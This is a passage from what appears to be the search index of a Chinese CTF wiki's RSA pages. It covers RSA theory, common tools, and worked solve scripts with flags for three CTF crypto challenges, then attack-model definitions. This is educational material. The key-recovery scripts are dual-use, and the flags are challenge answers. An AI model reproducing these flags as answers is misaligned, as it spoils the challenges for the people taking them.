16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 x4 = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 if ( x4 - x1 * p_q ) % ( x2 - x1 ) == 0 : print 'True' q = ( x4 - x1 * p_q ) / ( x2 - x1 ) print q p = p_q - q c = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 31337 , phin ) flag = gmpy2 . powmod ( c , d , p * q ) flag = hex ( flag )[ 2 :] print flag . decode ( 'hex' ) flag \u5982\u4e0b \u279c 2018 -\u56fd\u5bb6\u5b89\u5168\u5468\u7b2c\u4e00\u573a-puremath git: ( master ) \u2717 python exp.py True 7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417 flag { 6a66b8d5-6047-4299-a48e-4c4d1f874d12 }","title":"RSA \u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsa","text":"RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5728\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u548c\u7535\u5b50\u5546\u4e1a\u4e2d RSA \u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002RSA \u662f 1977 \u5e74\u7531\u7f57\u7eb3\u5fb7\u00b7\u674e\u7ef4\u65af\u7279\uff08Ron Rivest\uff09\u3001\u963f\u8fea\u00b7\u8428\u83ab\u5c14\uff08Adi Shamir\uff09\u548c\u4f26\u7eb3\u5fb7\u00b7\u963f\u5fb7\u66fc\uff08Leonard Adleman\uff09\u4e00\u8d77\u63d0\u51fa\u7684\u3002RSA \u5c31\u662f\u4ed6\u4eec\u4e09\u4eba\u59d3\u6c0f\u5f00\u5934\u5b57\u6bcd\u62fc\u5728\u4e00\u8d77\u7ec4\u6210\u7684\u3002 RSA \u7b97\u6cd5\u7684\u53ef\u9760\u6027\u7531\u6781\u5927\u6574\u6570\u56e0\u6570\u5206\u89e3\u7684\u96be\u5ea6\u51b3\u5b9a\u3002\u6362\u8a00\u4e4b\uff0c\u5bf9\u4e00\u6781\u5927\u6574\u6570\u505a\u56e0\u6570\u5206\u89e3\u6108\u56f0\u96be\uff0cRSA \u7b97\u6cd5\u6108\u53ef\u9760\u3002\u5047\u5982\u6709\u4eba\u627e\u5230\u4e00\u79cd\u5feb\u901f\u56e0\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u7684\u8bdd\uff0c\u90a3\u4e48\u7528 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u7684\u53ef\u9760\u6027\u5c31\u80af\u5b9a\u4f1a\u6781\u5ea6\u4e0b\u964d\u3002\u4f46\u627e\u5230\u8fd9\u6837\u7684\u7b97\u6cd5\u7684\u53ef\u80fd\u6027\u662f\u975e\u5e38\u5c0f\u7684\u3002\u5982\u4eca\uff0c\u53ea\u6709\u77ed\u7684 RSA \u5bc6\u94a5\u624d\u53ef\u80fd\u88ab\u5f3a\u529b\u65b9\u5f0f\u89e3\u7834\u3002\u5230 2017 \u5e74\u4e3a\u6b62\uff0c\u8fd8\u6ca1\u6709\u4efb\u4f55\u53ef\u9760\u7684\u653b\u51fb RSA \u7b97\u6cd5\u7684\u65b9\u5f0f\u3002","title":"RSA \u4ecb\u7ecd"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_1","text":"","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_2","text":"\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570 p p \u548c q q \uff0c\u8ba1\u7b97 N = p \\times q N = p \\times q \u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97 r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e r r \u7684\u6574\u6570 e e \uff0c\u4f7f e e \u548c r r \u4e92\u8d28\u3002\u5e76\u6c42\u5f97 e e \u5173\u4e8e r r \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a d d \uff0c\u6709 ed\\equiv 1 \\pmod r ed\\equiv 1 \\pmod r \u5c06 p p \u548c q q \u7684\u8bb0\u5f55\u9500\u6bc1 \u6b64\u65f6\uff0c (N,e) (N,e) \u662f\u516c\u94a5\uff0c (N,d) (N,d) \u662f\u79c1\u94a5\u3002","title":"\u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_3","text":"\u9996\u5148\u9700\u8981\u5c06\u6d88\u606f m m \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e N N \uff0c\u4e14\u4e0e N N \u4e92\u8d28\u7684\u6574\u6570 n n \u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a n^{e}\\equiv c\\pmod N n^{e}\\equiv c\\pmod N","title":"\u6d88\u606f\u52a0\u5bc6"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_4","text":"\u5229\u7528\u5bc6\u94a5 d d \u8fdb\u884c\u89e3\u5bc6\u3002 c^{d}\\equiv n\\pmod N c^{d}\\equiv n\\pmod N","title":"\u6d88\u606f\u89e3\u5bc6"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_5","text":"\u5373\u6211\u4eec\u8981\u8bc1 n^{ed} \\equiv n \\bmod N n^{ed} \\equiv n \\bmod N \uff0c\u5df2\u77e5 ed \\equiv 1 \\bmod \\phi(N) ed \\equiv 1 \\bmod \\phi(N) \uff0c\u90a3\u4e48 ed=k\\phi(N)+1 ed=k\\phi(N)+1 \uff0c\u5373\u9700\u8981\u8bc1\u660e n^{k\\phi(N)+1} \\equiv n \\bmod N n^{k\\phi(N)+1} \\equiv n \\bmod N \u8fd9\u91cc\u6211\u4eec\u5206\u4e24\u79cd\u60c5\u51b5\u8bc1\u660e \u7b2c\u4e00\u79cd\u60c5\u51b5 gcd(n,N)=1 gcd(n,N)=1 \uff0c\u90a3\u4e48 n^{\\phi(N)} \\equiv 1 \\bmod N n^{\\phi(N)} \\equiv 1 \\bmod N \uff0c\u56e0\u6b64\u539f\u5f0f\u6210\u7acb\u3002 \u7b2c\u4e8c\u79cd\u60c5\u51b5 gcd(n,N)!=1 gcd(n,N)!=1 \uff0c\u90a3\u4e48 n \u5fc5\u7136\u662f p \u6216\u8005 q \u7684\u500d\u6570\uff0c\u5e76\u4e14 n \u5c0f\u4e8e N\u3002\u6211\u4eec\u5047\u8bbe n=xp n=xp \u90a3\u4e48 x \u5fc5\u7136\u5c0f\u4e8e q\uff0c\u53c8\u7531\u4e8e q \u662f\u7d20\u6570\u3002\u90a3\u4e48 n^{\\phi(q)} \\equiv 1 \\bmod q n^{\\phi(q)} \\equiv 1 \\bmod q \u8fdb\u800c n^{k\\phi(N)}=n^{k(p-1)(q-1)}=(n^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q n^{k\\phi(N)}=n^{k(p-1)(q-1)}=(n^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q \u90a3\u4e48 n^{k\\phi(N)+1}=n+uqn n^{k\\phi(N)+1}=n+uqn \u8fdb\u800c n^{k\\phi(N)+1}=n+uqxp=n+uxN n^{k\\phi(N)+1}=n+uqxp=n+uxN \u6240\u4ee5\u539f\u5f0f\u6210\u7acb\u3002","title":"\u6b63\u786e\u6027\u8bc1\u660e"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_6","text":"","title":"\u57fa\u672c\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsatool","text":"\u5b89\u88c5 git clone https://github.com/ius/rsatool.git cd rsatool python rsatool.py -h \u751f\u6210\u79c1\u94a5 python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321","title":"RSAtool"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsa-converter","text":"\u6839\u636e\u7ed9\u5b9a\u5bc6\u94a5\u5bf9\uff0c\u751f\u6210 pem \u6587\u4ef6 \u6839\u636e n\uff0ce\uff0cd \u5f97\u51fa p\uff0cq","title":"RSA Converter"},{"location":"crypto/asymmetric/rsa/rsa_theory/#openssl","text":"\u67e5\u770b\u516c\u94a5\u6587\u4ef6 openssl rsa -pubin -in pubkey.pem -text -modulus \u89e3\u5bc6 rsautl -decrypt -inkey private.pem -in flag.enc -out flag \u66f4\u52a0\u5177\u4f53\u7684\u7ec6\u8282\u8bf7\u53c2\u8003 openssl --help \u3002","title":"openssl"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_7","text":"\u7f51\u7ad9\u5206\u89e3\uff0c factor.db \u547d\u4ee4\u884c\u5206\u89e3\uff0c factordb-pycli \uff0c\u501f\u7528 factordb \u6570\u636e\u5e93\u3002 yafu","title":"\u5206\u89e3\u6574\u6570\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_theory/#python","text":"","title":"python \u5e93"},{"location":"crypto/asymmetric/rsa/rsa_theory/#primefac","text":"\u6574\u6570\u5206\u89e3\u5e93\uff0c\u5305\u542b\u4e86\u5f88\u591a\u6574\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u3002","title":"primefac"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy","text":"gmpy.root(a, b) \uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 (x, y) \uff0c\u5176\u4e2d x \u4e3a a \u5f00 b \u6b21\u65b9\u7684\u503c\uff0c y \u662f\u5224\u65ad x \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf","title":"gmpy"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy2","text":"\u5b89\u88c5\u65f6\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u81ea\u5df1\u53e6\u884c\u5b89\u88c5 mfpr \u4e0e mpc \u5e93\u3002 gmpy2.iroot(a, b) \uff0c\u7c7b\u4f3c\u4e8e gmpy.root(a,b)","title":"gmpy2"},{"location":"crypto/asymmetric/rsa/rsa_theory/#pycrypto","text":"\u5b89\u88c5 sudo pip install pycrypto \u4f7f\u7528 import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 msg = 'crypto here' p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) key = PKCS1_v1_5 . new ( privatekey ) msg = key . decrypt ( enc . decode ( 'base64' ), e )","title":"pycrypto"},{"location":"crypto/asymmetric/rsa/rsa_theory/#jarvis-oj-basic-veryeasyrsa","text":"p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 \u6c42 d = \u8bf7\u63d0\u4ea4 PCTF{d} \u76f4\u63a5\u6839\u636e ed\\equiv 1 \\pmod r ed\\equiv 1 \\pmod r \uff0c\u5176\u4e2d r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \uff0c\u53ef\u5f97 d\u3002 import gmpy2 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phin = ( p - 1 ) * ( q - 1 ) print gmpy2 . invert ( e , phin ) \u279c Jarvis OJ-Basic-veryeasyRSA git: ( master ) \u2717 python exp.py 19178568796155560423675975774142829153827883709027717723363077606260717434369","title":"Jarvis OJ - Basic - veryeasyRSA"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-codegate-ctf-rsababy","text":"\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684 RSA\uff0c\u4e0d\u8fc7\u7a0b\u5e8f\u8fd8\u751f\u6210\u4e86\u4e24\u4e2a\u5947\u602a\u7684\u6570 e = 65537 n = p * q pi_n = ( p - 1 ) * ( q - 1 ) d = mulinv ( e , pi_n ) h = ( d + p ) ^ ( d - p ) g = d * ( p - 0xdeadbeef ) \u6240\u4ee5\uff0c\u95ee\u9898\u5e94\u8be5\u51fa\u81ea\u8fd9\u91cc\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4ece\u6b64\u4e0b\u624b\uff0c\u4e0d\u653e\u8fd9\u91cc\u5148\u5047\u8bbe const = 0xdeadbeef \u3002\u90a3\u4e48 eg = ed*(p-const) eg = ed*(p-const) \u8fdb\u800c\uff0c\u6839\u636e RSA \u53ef\u77e5 2^{eg}=2^{ed*(p-const)}=2^{p-const} \\pmod n 2^{eg}=2^{ed*(p-const)}=2^{p-const} \\pmod n 2^{p-const}*2^{const-1} = 2^{p-1} \\pmod n 2^{p-const}*2^{const-1} = 2^{p-1} \\pmod n \u6240\u4ee5 2^{p-1} = 2^{eg}*2^{const-1}+kn 2^{p-1} = 2^{eg}*2^{const-1}+kn \u800c\u4e0e\u6b64\u540c\u65f6\u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u6211\u4eec\u77e5\u9053 2^{p-1} \\equiv 1 \\pmod p 2^{p-1} \\equiv 1 \\pmod p \u6240\u4ee5 p|2^{p-1}-1 | 2^{eg+const-1}-1+kn p|2^{p-1}-1 | 2^{eg+const-1}-1+kn \u8fdb\u800c p|2^{eg+const-1}-1 p|2^{eg+const-1}-1 \u6240\u4ee5 p|gcd(2^{eg+const-1}-1,n) p|gcd(2^{eg+const-1}-1,n) \u56e0\u6b64\uff0c\u4ee3\u7801\u5982\u4e0b tmp = gmpy2 . powmod ( 2 , e * g + const - 1 , n ) - 1 p = gmpy2 . gcd ( tmp , n ) q = n / p phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) plain = gmpy2 . powmod ( data , d , n ) print hex ( plain )[ 2 :] . decode ( 'hex' )","title":"2018 CodeGate CTF Rsababy"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-pure-math","text":"\u9898\u76ee\u7684\u57fa\u672c\u63cf\u8ff0\u662f\u8fd9\u4e2a\u6837\u5b50\u7684 1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 Now, what\u2019s the FLAG??? \u6211\u4eec\u7684\u76ee\u7684\u57fa\u672c\u4e0a\u5c31\u662f\u6c42\u5f97 Flag\uff0c\u90a3\u4e48\u600e\u4e48\u505a\u5462?\u8fd9\u4e2a\u9898\u76ee\u9700\u8981\u6211\u4eec\u5177\u6709\u8f83\u597d\u7684\u6570\u8bba\u529f\u5e95\u3002 \u6839\u636e\u9898\u76ee\u4e2d\u8fd9\u6837\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe p\uff0cq \u90fd\u662f\u5927\u7d20\u6570\uff0c\u90a3\u4e48 p^{q-1} \\equiv 1\\bmod q p^{q-1} \\equiv 1\\bmod q \u90a3\u4e48 p^{q} \\equiv p \\bmod pq p^{q} \\equiv p \\bmod pq \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e 3 \u77e5\u9053 p^q+q^p \\equiv p+q \\bmod pq p^q+q^p \\equiv p+q \\bmod pq \u800c p+q \u53c8\u663e\u7136\u5c0f\u4e8e pq\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u77e5\u9053 p+q \u7684\u6570\u503c\u3002 \u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u5047\u8bbe1\uff0c2\uff0c3\uff0c4\uff0c5\u5bf9\u5e94\u7684\u503c\u5206\u522b\u4e3ax1~x5\u5219 \u6839\u636e4\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq \u53c8\u56e0\u4e3a 1 \u548c 2\uff0c\u5219 p^pp \\equiv px_1\\bmod pq p^pp \\equiv px_1\\bmod pq q^qq \\equiv qx_2 \\bmod pq q^qq \\equiv qx_2 \\bmod pq \u56e0\u6b64 px_1+qx_2 \\equiv x_4 \\bmod pq px_1+qx_2 \\equiv x_4 \\bmod pq \u6839\u636e x1 \u548c x2 \u7684\u6c42\u5f97\u65b9\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u8fd9\u91cc\u4e5f\u662f\u7b49\u53f7\uff0c\u56e0\u6b64\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u4e8c\u5143\u4e00\u6b21\u65b9\u7a0b\u7ec4\uff0c\u76f4\u63a5\u6c42\u89e3\u5373\u53ef\u3002 import gmpy2 x1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 x2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 p_q = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 x4 = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 if ( x4 - x1 * p_q ) % ( x2 - x1 ) == 0 : print 'True' q = ( x4 - x1 * p_q ) / ( x2 - x1 ) print q p = p_q - q c = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 31337 , phin ) flag = gmpy2 . powmod ( c , d , p * q ) flag = hex ( flag )[ 2 :] print flag . decode ( 'hex' ) flag \u5982\u4e0b \u279c 2018 -\u56fd\u5bb6\u5b89\u5168\u5468\u7b2c\u4e00\u573a-puremath git: ( master ) \u2717 python exp.py True 7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417 flag { 6a66b8d5-6047-4299-a48e-4c4d1f874d12 }","title":"2018 \u56fd\u5bb6\u5b89\u5168\u5468 pure math"},{"location":"crypto/attack_summary/attack-mode/","text":"\u7b80\u4ecb \u00b6 \u653b\u51fb\u6a21\u5f0f \u00b6 \u5728\u6211\u4eec\u653b\u51fb\u4e00\u4e2a\u5bc6\u7801\u5b66\u7cfb\u7edf\u65f6\uff0c\u6211\u4eec\u6216\u591a\u6216\u5c11\u4f1a\u5f97\u5230\u5173\u4e8e\u8fd9\u4e2a\u7cfb\u7edf\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u6839\u636e\u5f97\u5230\u4fe1\u606f\u91cf\u7684\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u540c\u3002\u5728\u5f53\u4eca\u7684\u5bc6\u7801\u5b66\u5206\u6790\u65f6\uff0c\u4e00\u822c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u8fd9\u4e2a\u5047\u8bbe\u662f\u5408\u7406\u7684\uff0c\u56e0\u4e3a\u5386\u53f2\u4e0a\u6709\u5f88\u591a\u4fdd\u5bc6\u7684\u7b97\u6cd5\u6700\u540e\u90fd\u88ab\u4eba\u6240\u77e5\uff0c\u6bd4\u5982 RC4\u3002\u88ab\u77e5\u9053\u7684\u65b9\u5f0f\u591a\u91cd\u591a\u6837\uff0c\u6bd4\u5982\u95f4\u8c0d\uff0c\u9006\u5411\u5de5\u7a0b\u7b49\u3002 \u8fd9\u91cc\u6211\u4eec\u6839\u636e\u653b\u51fb\u8005\u83b7\u53d6\u5bc6\u7801\u5b66\u7cfb\u7edf\u7684\u4fe1\u606f\u7684\u591a\u5c11\u5c06\u653b\u51fb\u6a21\u5f0f\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b \u552f\u5bc6\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u4ec5\u80fd\u83b7\u5f97\u4e00\u4e9b\u52a0\u5bc6\u8fc7\u7684\u5bc6\u6587\u3002 \u5df2\u77e5\u660e\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u6709\u4e00\u4e9b\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u3002 \u9009\u62e9\u660e\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u65f6\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u660e\u6587\uff0c\u5e76\u83b7\u53d6\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u4e2d\u9014\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u65b0\u7684\u660e\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u5bc6\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u660e\u6587\u653b\u51fb\u3002 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u4e4b\u524d\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u5bc6\u6587\uff0c\u5e76\u83b7\u53d6\u89e3\u5bc6\u540e\u7684\u660e\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u56fe\u4e2d\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u4e00\u4e9b\u65b0\u7684\u5bc6\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u5bc6\u6587\u653b\u51fb\u3002 \u76f8\u5173\u5bc6\u94a5\u653b\u51fb \uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u4e24\u4e2a\u6216\u591a\u4e2a\u76f8\u5173\u5bc6\u94a5\u7684\u52a0\u5bc6\u6216\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u6216\u660e\u6587\u3002\u4f46\u662f\u653b\u51fb\u8005\u4e0d\u77e5\u9053\u8fd9\u4e9b\u5bc6\u94a5\u3002 \u5e38\u89c1\u653b\u51fb\u65b9\u6cd5 \u00b6 \u6839\u636e\u4e0d\u540c\u7684\u653b\u51fb\u6a21\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u76ee\u524d\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709 \u66b4\u529b\u653b\u51fb \u4e2d\u95f4\u76f8\u9047\u653b\u51fb \u7ebf\u6027\u5206\u6790 \u5dee\u5206\u5206\u6790 \u4e0d\u53ef\u80fd\u5dee\u5206\u5206\u6790 \u79ef\u5206\u5206\u6790 \u4ee3\u6570\u5206\u6790 \u76f8\u5173\u5bc6\u94a5\u653b\u51fb \u4fa7\u4fe1\u9053\u653b\u51fb \u53c2\u8003\u6587\u732e \u00b6 https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90","title":"\u7b80\u4ecb"},{"location":"crypto/attack_summary/attack-mode/#_1","text":"","title":"\u7b80\u4ecb"},{"location":"crypto/attack_summary/attack-mode/#_2","text":"\u5728\u6211\u4eec\u653b\u51fb\u4e00\u4e2a\u5bc6\u7801\u5b66\u7cfb\u7edf\u65f6\uff0c\u6211\u4eec\u6216\u591a\u6216\u5c11\u4f1a\u5f97\u5230\u5173\u4e8e\u8fd9\u4e2a\u7cfb\u7edf\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u6839\u636e\u5f97\u5230\u4fe1\u606f\u91cf\u7684\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u540c\u3002\u5728\u5f53\u4eca\u7684\u5bc6\u7801\u5b66\u5206\u6790\u65f6\uff0c\u4e00\u822c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u8fd9\u4e2a\u5047\u8bbe\u662f\u5408\u7406\u7684\uff0c\u56e0\u4e3a\u5386\u53f2\u4e0a\u6709\u5f88\u591a\u4fdd\u5bc6\u7684\u7b97\u6cd5\u6700\u540e\u90fd\u88ab\u4eba\u6240\u77e5\uff0c\u6bd4\u5982 RC4\u3002\u88ab\u77e5\u9053\u7684\u65b9\u5f0f\u591a\u91cd\u591a\u6837\uff0c\u6bd4\u5982\u95f4\u8c0d\uff0c\u9006\u5411\u5de5\u7a0b\u7b49\u3002 \u8fd9\u91cc\u6211\u4eec\u6839\u636e\u653b\u51fb\u8005\u83b7\u53d6\u5bc6\u7801\u5b66\u7cfb\u7edf\u7684\u4fe1\u606f\u7684\u591a\u5c11\u5c06\u653b\u51fb\u6a21\u5f0f\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b \u552f\u5bc6\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u4ec5\u80fd\u83b7\u5f97\u4e00\u4e9b\u52a0\u5bc6\u8fc7\u7684\u5bc6\u6587\u3002 \u5df2\u77e5\u660e\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u6709\u4e00\u4e9b\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u3002 \u9009\u62e9\u660e\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u65f6\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u660e\u6587\uff0c\u5e76\u83b7\u53d6\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u4e2d\u9014\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u65b0\u7684\u660e\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u5bc6\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u660e\u6587\u653b\u51fb\u3002 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u4e4b\u524d\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u5bc6\u6587\uff0c\u5e76\u83b7\u53d6\u89e3\u5bc6\u540e\u7684\u660e\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u56fe\u4e2d\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u4e00\u4e9b\u65b0\u7684\u5bc6\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u5bc6\u6587\u653b\u51fb\u3002 \u76f8\u5173\u5bc6\u94a5\u653b\u51fb 